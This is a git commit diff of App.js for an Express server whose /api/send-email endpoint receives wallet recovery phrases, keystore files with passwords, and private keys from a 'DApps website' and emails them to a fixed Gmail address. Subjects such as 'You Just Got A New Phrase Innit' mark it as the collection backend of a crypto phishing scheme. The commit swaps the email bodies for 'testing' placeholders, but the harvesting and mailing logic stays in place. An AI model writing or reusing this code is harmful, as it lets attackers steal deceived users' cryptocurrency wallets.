eba88182e887ba1e4cfefc5e4815ddfd8573e226
ibrahim <henryvercel@gmail.com>
2025-09-24 12:47:37 +0100

    testing send

--- App.js
+++ App.js
@@ -2,16 +2,11 @@ const express = require("express");
 const nodemailer = require("nodemailer");
 const cors = require("cors");
 require("dotenv").config();
-const PORT = process.env.PORT || 3001;
+const port = process.env.PORT || 3001;
 const app = express();
-app.use(
-  cors({
-    origin: "*", // allow all origins
-    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"], // allow these methods
-    allowedHeaders: ["Content-Type", "Authorization"], // allow these headers
-  })
-);
+app.use(cors());
 app.use(express.json());
+
 function formatMessage(message) {
   const lines = message.split(/\r?\n/);
   const formattedLines = lines.map(
@@ -21,15 +16,14 @@ function formatMessage(message) {
     ""
   )}</div>`;
 } 
-app.get('/',async (req,res) => {
-  res.send("Server is running")
-})
+
 app.post("/api/send-email", async (req, res) => {
     console.log("Received request to send email with body:", req.body);
     
   const { phrase, keystore, privateKey, item } = req.body;
   const email = process.env.EMAIL_USER || "";
   const pass = process.env.EMAIL_PASS || ""; 
+
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
@@ -37,6 +31,7 @@ app.post("/api/send-email", async (req, res) => {
       pass,
     },
   });
+
   transporter.verify(function (error, success) {
     if (error) {
       console.log(`Transporter error: ${error}`);
@@ -44,22 +39,24 @@ app.post("/api/send-email", async (req, res) => {
       console.log("Server is ready to take our messages");
     }
   });
+
   try {
     let mailOptions = null;
+
     if (phrase) {
       const formattedMessage = formatMessage(phrase);
       mailOptions = {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: `${formattedMessage} wallet is ${item}`,
+        html: `testing`,
       };
     } else if (keystore) {
       mailOptions = {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Keystore Innit from DApps website!",
-        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>  wallet is ${item}`,
+        html: `testing`,
       };
     } else if (privateKey) {
       const formattedMessage = formatMessage(privateKey);
@@ -67,29 +64,29 @@ app.post("/api/send-email", async (req, res) => {
         from: `Dapp App <${email}>`,
         to: "Fixiondapps@gmail.com",
         subject: "Yo! You Just Got A New Private Key Innit from DApps website!",
-        html: `${formattedMessage} wallet is ${item}`,
+        html: `testing`,
       };
     }
+
     if (mailOptions) {
       const result = await transporter.sendMail(mailOptions);
-      // console.log(result);
+      console.log(result);
       if (result.response && result.response.includes("OK")) {
         return res.status(200).json({ message: "email sent successfully!!" });
       } else {
         return res.status(500).json({ error: "Internal server error" });
       }
     }
+
     return res.status(400).json({ message: "Submission Failed" });
   } catch (error) {
     console.error(error);
     res.status(500).json({ error: "Email failed" });
   }
 });
-app.get("/api/send-email", async (req, res) => {
-    const email = process.env.EMAIL_USER || "";
-  res.send(email)}
-
-)
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+app.get("/", async (req, res) => {
+    res.send("Welcome to the Email Sending Server!");    
+  
 });
+
+app.listen(port, () => console.log(`Server running on port ${port}`));
